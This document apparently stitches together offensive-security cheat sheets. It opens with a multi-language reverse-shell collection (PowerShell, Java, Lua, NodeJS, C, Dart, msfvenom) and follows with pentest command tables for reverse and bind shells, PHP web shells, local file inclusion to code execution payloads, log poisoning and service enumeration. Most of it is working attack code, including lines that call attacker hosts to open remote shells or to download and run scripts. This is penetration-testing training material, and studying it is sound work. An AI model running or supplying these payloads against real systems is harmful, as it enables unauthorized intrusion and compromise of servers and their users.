powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#awk)Awk

```powershell
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java)Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

#### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java-alternative-1)Java Alternative 1

```java
String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java-alternative-2)Java Alternative 2

**NOTE**: This is more stealthy

```java
Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#telnet)Telnet

```shell
In Attacker machine start two listeners:
nc -lvp 8080
nc -lvp 8081

In Victime machine run below command:
telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#war)War

```java
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#lua)Lua

Linux only

```powershell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

Windows and Linux

```powershell
lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)NodeJS

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();


or

require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy)Groovy

by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Java reverse shell also work for Groovy

```java
String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy-alternative-1)Groovy Alternative 1

**NOTE**: This is more stealthy

```java
Thread.start {
    // Reverse shell here
}
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#c)C

Compile with `gcc /tmp/shell.c --output csh && csh`

```cs
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#dart)Dart

```java
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("10.0.0.1", 4242).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
```

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#meterpreter-shell)Meterpreter Shell

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-staged-reverse-tcp)Windows Staged reverse TCP

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-stageless-reverse-tcp)Windows Stageless reverse TCP

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#linux-staged-reverse-tcp)Linux Staged reverse TCP

```powershell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#linux-stageless-reverse-tcp)Linux Stageless reverse TCP

```powershell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#other-platforms)Other platforms

```powershell
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)Spawn TTY Shell

In order to catch a shell, you need to listen on the desired port. `rlwrap` will enhance the shell, allowing you to clear the screen with `[CTRL] + [L]`.

```powershell
rlwrap nc 10.0.0.1 4242

rlwrap -r -f . nc 10.0.0.1 4242
-f . will make rlwrap use the current history file as a completion word list.
-r Put all words seen on in- and output on the completion list.
```

Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.

⚠️ OhMyZSH might break this trick, a simple `sh` is recommended

> The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect

```powershell
ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

or use `socat` binary to get a fully tty reverse shell

```shell
socat file:`tty`,raw,echo=0 tcp-listen:12345
```

Alternatively, `rustcat` binary can automatically inject the TTY shell command.

The shell will be automatically upgraded and the TTY size will be provided for manual adjustment. Not only that, upon exiting the shell, the terminal will be reset and thus usable.

```shell
stty raw -echo; stty size && rcat l -ie "/usr/bin/script -qc /bin/bash /dev/null" 6969 && reset
```

Spawn a TTY shell from an interpreter

```powershell
/bin/sh -i
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c "__import__('pty').spawn('/bin/bash')"
python3 -c "__import__('subprocess').call(['/bin/bash'])"
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
perl -e 'print `/bin/bash`'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
```

- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`
- mysql: `! bash`

Alternative TTY method

```
www-data@debian:/dev/shm$ su - user
su: must be run from a terminal

www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
www-data@debian:/dev/shm$ su - user
Password: P4ssW0rD

user@debian:~$ 
```

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#fully-interactive-reverse-shell-on-windows)Fully interactive reverse shell on Windows

The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.

**ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**

Server Side:

```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Client Side:

```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

Offline version of the ps1 available at --> [https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1)

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#references)References

- [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
- [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Spawning a TTY Shell](http://netsec.ws/?p=337)
- [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)## Basic Tools

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `sudo openvpn user.ovpn` | Connect to VPN |
| `ifconfig`/`ip a` | Show our IP address |
| `netstat -rn` | Show networks accessible via the VPN |
| `ssh user@10.10.10.10` | SSH to a remote server |
| `ftp 10.129.42.253` | FTP to a remote server |
| **tmux** |
| `tmux` | Start tmux |
| `ctrl+b` | tmux: default prefix |
| `prefix c` | tmux: new window |
| `prefix 1` | tmux: switch to window (`1`) |
| `prefix shift+%` | tmux: split pane vertically |
| `prefix shift+"` | tmux: split pane horizontally |
| `prefix ->` | tmux: switch to the right pane |
| **Vim** |
| `vim file` | vim: open `file` with vim |
| `esc+i` | vim: enter `insert` mode |
| `esc` | vim: back to `normal` mode |
| `x` | vim: Cut character |
| `dw` | vim: Cut word |
| `dd` | vim: Cut full line |
| `yw` | vim: Copy word |
| `yy` | vim: Copy full line |
| `p` | vim: Paste |
| `:1` | vim: Go to line number 1. |
| `:w` | vim: Write the file 'i.e. save' |
| `:q` | vim: Quit |
| `:q!` | vim: Quit without saving |
| `:wq` | vim: Write and quit |

## Pentesting
| **Command**   | **Description**   |
| --------------|-------------------|
| **Service Scanning** |
| `nmap 10.129.42.253` | Run nmap on an IP |
| `nmap -sV -sC -p- 10.129.42.253` | Run an nmap script scan on an IP |
| `locate scripts/citrix` | List various available nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap script on an IP |
| `netcat 10.10.10.10 22` | Grab banner of an open port |
| `smbclient -N -L \\\\10.129.42.253` | List SMB Shares |
| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP secret string |
| **Web Enumeration** |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Run a directory scan on a website |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website |
| `curl -IL https://www.inlanefreight.com` | Grab website banner |
| `whatweb 10.10.10.121` | List details about the webserver/certificates |
| `curl 10.10.10.121/robots.txt` | List potential directories in `robots.txt` |
| `ctrl+U` | View page source (in Firefox) |
| **Public Exploits** |
| `searchsploit openssh 7.2` | Search for public exploits for a web application |
| `msfconsole` | MSF: Start the Metasploit Framework |
| `search exploit eternalblue` | MSF: Search for public exploits in MSF |
| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |
| `show options` | MSF: Show required options for an MSF module |
| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |
| `check` | MSF: Test if the target server is vulnerable |
| `exploit` | MSF: Run the exploit on the target server is vulnerable |
| **Using Shells** |
| `nc -lvnp 1234` | Start a `nc` listener on a local port |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |
| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |
| **Privilege Escalation** |
| `./linpeas.sh` | Run `linpeas` script to enumerate remote server |
| `sudo -l` | List available `sudo` privileges |
| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
| `sudo su -` | Switch to root user (if we have access to `sudo su`) |
| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |
| `ssh-keygen -f key` | Create a new SSH key |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |
| **Transferring Files** |
| `python3 -m http.server 8000` | Start a local webserver |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file on the remote server from our local machine |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0` | Convert a file to `base64` |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | Convert a file from `base64` back to its orig |
| `md5sum shell` | Check the file's `md5sum` to ensure it converted correctly |

#hacking #shell #enumeration #scanning #cheatsheet 
## Local File Inclusion

| **Command** | **Description** |
| --------------|-------------------|
| **Basic LFI** |
| `/index.php?language=/etc/passwd` | Basic LFI |
| `/index.php?language=../../../../etc/passwd` | LFI with path traversal |
| `/index.php?language=/../../../etc/passwd` | LFI with name prefix |
| `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path |
| **LFI Bypasses** |
| `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path traversal filter |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |


## Remote Code Execution

| **Command** | **Description** |
| --------------|-------------------|
| **PHP Wrappers** |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE with data wrapper |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |
| **RFI** |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | Include remote PHP web shell |
| **LFI + Upload** |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious image |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | RCE with malicious uploaded image |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive 'as jpg' |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | RCE with malicious uploaded zip |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Create malicious phar 'as jpg' |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | RCE with malicious uploaded phar |
| **Log Poisoning** |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | Read PHP session parameters |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Poison PHP session with web shell |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | RCE through poisoned PHP session |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison server log |
| `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE through poisoned PHP session |


## Misc

| **Command** | **Description** |
| --------------|-------------------|
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
| `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |
| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)|
| [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) |
| [Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
| [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) |
| [Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
| [Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) |


## File Inclusion Functions

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| ----- | :-----: | :-----: | :-----: |
| **PHP** |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()`/`file()` | ✅ | ❌ | ❌ |
| **NodeJS** |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** | |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |# Footprinting
## Infrastructure-based Enumeration

|**Command**|**Description**|
|-|-|
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency. |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | Scan each IP address in a list using Shodan. |

----
## Host-based Enumeration


##### FTP
|**Command**|**Description**|
|-|-|
| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |


##### SMB
|**Command**|**Description**|
|-|-|
| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB. |
| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |
| `rpcclient -U "" <FQDN/IP>` | Interaction with the target using RPC. |
| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |
| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |


##### NFS
|**Command**|**Description**|
|-|-|
| `showmount -e <FQDN/IP>` | Show available NFS shares. |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS` | Unmount the specific NFS share. |


##### DNS
|**Command**|**Description**|
|-|-|
| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |
| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |
| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver. |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |



##### SMTP
|**Command**|**Description**|
|-|-|
| `telnet <FQDN/IP> 25` |  |


##### IMAP/POP3
|**Command**|**Description**|
|-|-|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. |


##### SNMP
|**Command**|**Description**|
|-|-|
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |


##### MySQL
|**Command**|**Description**|
|-|-|
| `mysql -u <user> -p<password> -h <FQDN/IP>` | Login to the MySQL server. |


##### MSSQL
|**Command**|**Description**|
|-|-|
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |


##### IPMI
|**Command**|**Description**|
|-|-|
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |


##### Linux Remote Management
|**Command**|**Description**|
|-|-|
| `ssh-audit.py <FQDN/IP>` | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>` | Log in to the SSH server using the SSH client. |
| `ssh -i private.key <user>@<FQDN/IP>` | Log in to the SSH server using private key. |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication. |


##### Windows Remote Management
|**Command**|**Description**|
|-|-|
| `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | Log in to the RDP server from Linux. |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Log in to the WinRM server. |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |

##### Oracle TNS
|**Command**|**Description**|
|-|-|
| `./odat.py all -s <FQDN/IP>` | Perform a variety of scans to gather information about the Oracle database services and its components. |
| `sqlplus <user>/<pass>@<FQDN/IP>/<db>` | Log in to the Oracle database. |
| `./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt` | Upload a file with Oracle RDBMS. |# Information Gathering Web
## WHOIS

| **Command** | **Description** |
|-|-|
| `export TARGET="domain.tld"` | Assign target to an environment variable. |
| `whois $TARGET` | WHOIS lookup for the target. |


---
## DNS Enumeration

| **Command** | **Description** |
|-|-|
| `nslookup $TARGET` | Identify the `A` record for the target domain. |
| `nslookup -query=A $TARGET` | Identify the `A` record for the target domain. |
| `dig $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `dig a $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `nslookup -query=PTR <IP>` | Identify the `PTR` record for the target IP address. |
| `dig -x <IP> @<nameserver/IP>` | Identify the `PTR` record for the target IP address.  |
| `nslookup -query=ANY $TARGET` | Identify `ANY` records for the target domain. |
| `dig any $TARGET @<nameserver/IP>` | Identify `ANY` records for the target domain. |
| `nslookup -query=TXT $TARGET` | Identify the `TXT` records for the target domain. |
| `dig txt $TARGET @<nameserver/IP>` | Identify the `TXT` records for the target domain. |
| `nslookup -query=MX $TARGET` | Identify the `MX` records for the target domain. |
| `dig mx $TARGET @<nameserver/IP>` | Identify the `MX` records for the target domain. |


---
## Passive Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| `VirusTotal` | [https://www.virustotal.com/gui/home/url](https://www.virustotal.com/gui/home/url) |
| `Censys` | [https://censys.io/](https://censys.io/) |
| `Crt.sh` | [https://crt.sh/](https://crt.sh/) |
| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u` | All subdomains for a given domain. |
